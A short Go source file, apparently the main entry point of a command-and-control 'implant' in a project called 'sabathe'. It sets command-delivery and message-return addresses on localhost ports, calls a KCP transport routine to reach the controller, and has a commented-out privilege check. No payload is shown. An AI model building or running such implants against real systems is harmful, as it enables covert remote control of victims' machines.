package main

import (
	"sabathe/implant/config"
	"sabathe/implant/tansport"
)

var conf = config.ImplantConfig{
	CmdDeliveryAddress: "127.0.0.1:8081",
	MsgReturnAddress:   "127.0.0.1:8080",
}

func main() {
	tansport.RequestKcpServer(&conf)
	//fmt.Println(core.IsHighPriv())
}
